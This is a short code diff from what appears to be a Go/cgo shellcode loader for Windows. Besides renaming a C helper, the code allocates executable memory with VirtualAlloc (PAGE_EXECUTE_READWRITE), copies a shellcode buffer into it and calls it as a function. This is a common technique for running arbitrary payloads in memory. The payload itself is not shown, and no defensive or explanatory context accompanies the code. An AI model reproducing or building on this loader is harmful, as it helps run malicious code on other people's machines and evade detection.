@@ -4,7 +4,7 @@ package main
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
-void execute(unsigned char *ptr, char *shellcode, size_t length) {
+void exec(unsigned char *ptr, char *shellcode, size_t length) {
 
   memcpy(ptr, shellcode, length);
   (*(void(*)())ptr)();
@@ -39,7 +39,6 @@ func main() {
 	}
 	shell := []byte(shelly)
 	addr, _, err := VirtualAlloc.Call(0, unsafe.Sizeof(shell), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	C.execute((*C.uchar)(unsafe.Pointer(addr)), (*C.char)(unsafe.Pointer(&shell[0])), (C.size_t)(len(shell)))
-	//**(**uintptr)(unsafe.Pointer(&fun)) = *(*uintptr)(unsafe.Pointer(&addr))
-	//fun()
+	C.exec((*C.uchar)(unsafe.Pointer(addr)), (*C.char)(unsafe.Pointer(&shell[0])), (C.size_t)(len(shell)))
+
 }
